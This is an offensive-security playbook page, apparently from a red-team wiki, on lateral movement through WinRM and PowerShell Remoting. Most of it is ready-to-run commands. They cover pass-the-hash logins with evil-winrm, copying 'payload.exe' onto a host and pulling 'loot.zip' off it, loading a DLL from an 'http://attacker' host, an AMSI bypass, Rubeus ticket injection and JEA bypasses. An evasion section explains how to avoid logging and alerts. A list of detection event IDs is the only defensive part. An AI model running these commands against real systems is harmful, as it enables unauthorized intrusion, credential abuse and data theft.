# WinRM / PSRemoting Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1021.006 - Remote Services: Windows Remote Management
> **Platforms**: Windows
> **Required Privileges**: Local Administrator or Remote Management Users group membership
> **OPSEC Risk**: Low-Medium

## Strategic Overview

Windows Remote Management (WinRM) and its PowerShell Remoting (PSRemoting) layer are among the lowest-OPSEC lateral movement techniques available. WinRM is the Microsoft implementation of the WS-Management protocol, running on TCP 5985 (HTTP) and 5986 (HTTPS). It is widely enabled in enterprise environments for legitimate system administration, making attacker traffic blend naturally. PSRemoting provides a full interactive PowerShell session on the remote host, supporting script execution, file transfer, and persistent sessions. The key challenge with WinRM is the Kerberos "double hop" problem -- credentials do not automatically delegate beyond the first remote host. Red team leads must understand the workarounds (CredSSP, resource-based constrained delegation, or ticket injection) to chain WinRM hops effectively. In a well-configured enterprise, WinRM traffic between admin workstations and servers is expected and rarely triggers alerts.

## Technical Deep-Dive

### 1. Interactive PSRemoting Session

```powershell
# Enter interactive remote session (uses current credentials)
Enter-PSSession -ComputerName fileserver.corp.local

# With explicit credentials
$cred = New-Object System.Management.Automation.PSCredential("corp\administrator", (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force))
Enter-PSSession -ComputerName fileserver.corp.local -Credential $cred

# Using IP address (requires TrustedHosts configuration or HTTPS)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.50" -Force
Enter-PSSession -ComputerName 192.168.1.50 -Credential $cred

# Over HTTPS (port 5986)
Enter-PSSession -ComputerName fileserver.corp.local -UseSSL -Credential $cred
```

### 2. Invoke-Command for Remote Execution

```powershell
# Execute command on single host
Invoke-Command -ComputerName fileserver.corp.local -ScriptBlock { whoami; hostname } -Credential $cred

# Execute on multiple hosts simultaneously (fan-out)
$targets = @("server01", "server02", "server03")
Invoke-Command -ComputerName $targets -ScriptBlock { Get-Process } -Credential $cred

# Execute a local script on remote host
Invoke-Command -ComputerName fileserver.corp.local -FilePath C:\tools\recon.ps1 -Credential $cred

# Persistent session (maintains state between commands)
$session = New-PSSession -ComputerName fileserver.corp.local -Credential $cred
Invoke-Command -Session $session -ScriptBlock { $env:COMPUTERNAME }
Invoke-Command -Session $session -ScriptBlock { Get-ChildItem C:\ }

# Copy files via PSSession
Copy-Item -Path C:\tools\payload.exe -Destination C:\Windows\Temp\ -ToSession $session
Copy-Item -Path C:\Windows\Temp\loot.zip -Destination C:\local\ -FromSession $session
```

### 3. Evil-WinRM (Feature-Rich Linux Client)

```bash
# Basic authentication
evil-winrm -i 192.168.1.50 -u administrator -p 'P@ssw0rd'

# Pass the Hash authentication
evil-winrm -i 192.168.1.50 -u administrator -H e19ccf75ee54e06b06a5907af13cef42

# With Kerberos authentication
evil-winrm -i dc01.corp.local -r corp.local

# Built-in features (from evil-winrm shell):
# Upload/download files
upload /tmp/SharpHound.exe C:\Windows\Temp\SharpHound.exe
download C:\Windows\Temp\loot.zip /tmp/loot.zip

# Load and execute .NET assemblies in memory
Dll-Loader -http http://attacker/payload.dll
Invoke-Binary /tmp/Rubeus.exe dump /nowrap

# Load PowerShell scripts
menu  # Shows available loaded commands
Bypass-4MSI  # AMSI bypass attempt

# Enable SSL (port 5986)
evil-winrm -i 192.168.1.50 -u administrator -p 'P@ssw0rd' -S
```

### 4. Solving the Kerberos Double Hop Problem

```powershell
# Problem: From Host A → PSRemote to Host B → cannot access Host C
# The credential does not delegate beyond the first hop

# Solution 1: CredSSP (requires configuration -- increases attack surface)
Enable-WSManCredSSP -Role Client -DelegateComputer *.corp.local -Force
Enable-WSManCredSSP -Role Server -Force  # On the intermediate host
Enter-PSSession -ComputerName hostB -Credential $cred -Authentication CredSSP

# Solution 2: Inject ticket on the intermediate host
# From Host A, PSRemote to Host B, then inject a TGT
Invoke-Command -ComputerName hostB -ScriptBlock {
    # Upload and run Rubeus to inject ticket
    C:\temp\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt
    # Now Host B can access Host C
    dir \\hostC\C$
}

# Solution 3: Resource-based constrained delegation (RBCD)
# Configure Host B to allow delegation to Host C on behalf of users
# This is a domain-level configuration change

# Solution 4: Port forwarding / proxying instead of double-hop
# Use SSH tunnel or netsh portproxy to reach Host C directly
```

### 5. JEA (Just Enough Administration) Bypass

```powershell
# Enumerate JEA endpoints
Get-PSSessionConfiguration | Where-Object {$_.RunAsUser}

# Connect to JEA endpoint
Enter-PSSession -ComputerName target -ConfigurationName JEAEndpoint

# JEA bypass techniques:
# 1. Look for commands that allow arbitrary execution
Get-Command  # See what's available in the constrained session

# 2. Abuse allowed cmdlets with wildcard parameters
# Example: If Copy-Item is allowed, copy sensitive files

# 3. Language mode escape (if in ConstrainedLanguage)
# Check current mode: $ExecutionContext.SessionState.LanguageMode

# 4. RunAs account abuse -- JEA sessions often run as a privileged service account
whoami  # May reveal a privileged RunAs identity
```

### 6. WinRM Configuration for Access

```powershell
# Enable WinRM on a target (if you have other access)
Enable-PSRemoting -Force -SkipNetworkProfileCheck

# Enable WinRM via WMI remotely
wmic /node:TARGET process call create "powershell Enable-PSRemoting -Force"

# Check WinRM service status
Test-WSMan -ComputerName target

# Configure WinRM listener for HTTPS
winrm quickconfig -transport:https

# Allow connections from specific IPs
Set-Item WSMan:\localhost\Service\AllowRemoteAccess -Value $true
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4648** (Explicit credential logon) for WinRM authentication
- **Event ID 91** (WSMan connection established) in Microsoft-Windows-WinRM/Operational
- **Event ID 4103/4104** (PowerShell Module/Script Block Logging) captures remoting commands
- **Event ID 6** (WSMan session created) in WinRM operational logs
- Network connections to TCP 5985/5986 from unexpected source workstations
- PowerShell remoting creates wsmprovhost.exe on the target
- Sysmon Event ID 3 for network connections to WinRM ports

### Evasion Techniques

- WinRM is a standard admin tool -- operations from expected admin workstations rarely trigger alerts
- Use HTTPS (port 5986) to encrypt traffic and prevent content inspection
- Leverage `Invoke-Command` for quick execution instead of persistent sessions (shorter window of exposure)
- Avoid running PowerShell scripts that trigger Script Block Logging -- use compiled .NET assemblies instead
- Use evil-winrm's built-in AMSI bypass capabilities before loading tooling
- Time remoting activity to coincide with normal IT administration windows
- Use domain accounts that are members of Remote Management Users rather than local admin to appear less privileged

## Cross-References

- [[pass-the-hash]] - PtH authentication into WinRM via Evil-WinRM
- [[wmi-lateral]] - Alternative remote execution via WMI
- [[psexec-smbexec]] - SMB-based alternatives when WinRM is unavailable
- Section 07: Persistence - PSRemoting for persistent access
- Section 06: Credential Access - Double hop credential delegation issues

## References

- https://attack.mitre.org/techniques/T1021/006/
- https://github.com/Hackplayers/evil-winrm
- https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands
- https://posts.specterops.io/youre-doing-wsman-wrong-3-common-mistakes-with-powershell-remoting-and-how-to-fix-them-2fc0e1b0f885
- https://www.thehacker.recipes/ad/movement/winrm
